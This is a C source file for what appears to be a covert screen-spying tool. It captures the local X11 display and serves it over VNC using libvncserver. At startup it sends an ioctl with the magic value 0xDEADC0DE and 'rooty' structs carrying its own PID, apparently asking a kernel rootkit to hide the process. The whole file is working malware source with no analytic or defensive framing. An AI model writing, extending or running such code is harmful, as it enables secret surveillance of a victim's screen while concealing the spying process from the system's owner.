#include <rfb/rfb.h>
#include <X11/Xlib.h>
#include <X11/X.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

#define AUTH_TOKEN 0xDEADC0DE
#define PICTURE_TIMEOUT (1.0/1.0)

#define BPP 4

char *contents;
int x,y;

int width;
int height;

XImage *image;
Display *display;
Window root;

struct rooty_proc_args
{
    unsigned short pid;
};

struct rooty_args
{
    unsigned short cmd;
    void *ptr;
};

int timer()
{
    static struct timeval now= {0,0}, then= {0,0};
    double elapsed, dnow, dthen;
    gettimeofday(&now,NULL);
    dnow  = now.tv_sec  + (now.tv_usec /1000000.0);
    dthen = then.tv_sec + (then.tv_usec/1000000.0);
    elapsed = dnow - dthen;
    if (elapsed > PICTURE_TIMEOUT)
        memcpy((char *)&then, (char *)&now, sizeof(struct timeval));
    return elapsed > PICTURE_TIMEOUT;
}

int refresh(void)
{
    display = XOpenDisplay(":0.0");
    root = DefaultRootWindow(display);
    image = XGetImage(display,root, 0,0 , width,height,AllPlanes, ZPixmap);
    for (x = 0; x < width; x++)
        for (y = 0; y < height ; y++)
        {
            unsigned long pixel = XGetPixel(image,x,y);

            unsigned char blue = (unsigned char)pixel;
            unsigned char green = (unsigned char)((pixel)>>8);
            unsigned char red = (unsigned char)(pixel >> 16);

            contents[(x + width * y) * 4] = red;
            contents[(x + width * y) * 4+1] = green;
            contents[(x + width * y) * 4+2] = blue;
        }
    return 1;
}

int main(int argc,char** argv)
{
	struct rooty_args rooty_args;
	struct rooty_proc_args rooty_proc_args;
	int sockfd;
	int io;

	sockfd = socket(AF_INET, SOCK_STREAM, 6);
	rooty_proc_args.pid = getpid();
    rooty_args.cmd = 1;
    rooty_args.ptr = &rooty_proc_args;

    io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
        
    long usec;
    printf("Process PID: %d\n",getpid());
    printf("Opening display :0... ");
    display = XOpenDisplay(":0.0");
    printf("Display :0 opened\n");
    root = DefaultRootWindow(display);
    printf("Got rootWindow!\n");
    XWindowAttributes gwa;

    XGetWindowAttributes(display, root, &gwa);
    width = gwa.width;
    height = gwa.height;

    printf("Screen parameters:\n\tWidth: %d\n\tHeight: %d\n",width,height);

    contents = (char*)malloc(width*height*BPP);

    rfbScreenInfoPtr server=rfbGetScreen(&argc,argv,width,height,8,3,BPP);

    server->frameBuffer=contents;
    server->alwaysShared=(1==1);

    rfbInitServer(server);
    while (rfbIsActive(server))
    {
        if (timer())
            if (refresh())
                rfbMarkRectAsModified(server,0,0,width,height);

        usec = server->deferUpdateTime*1000;
        rfbProcessEvents(server,usec);
    }
    return 0;
}
